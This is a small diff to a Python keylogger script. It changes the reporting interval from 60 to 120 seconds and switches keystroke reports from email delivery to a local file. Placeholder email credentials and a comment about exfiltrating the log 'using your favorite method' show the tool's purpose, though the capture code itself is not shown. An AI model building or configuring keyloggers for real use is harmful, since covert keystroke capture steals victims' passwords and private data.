@@ -4,7 +4,7 @@ import smtplib # for sending email using SMTP protocol (gmail)
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 120 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "YOUREMAIL"
 EMAIL_PASSWORD = "YOURPASSWORD"
 
@@ -112,5 +112,5 @@ if __name__ == "__main__":
     # if you want a keylogger to record keylogs to a local file 
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     # (and then send it using your favorite method)
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
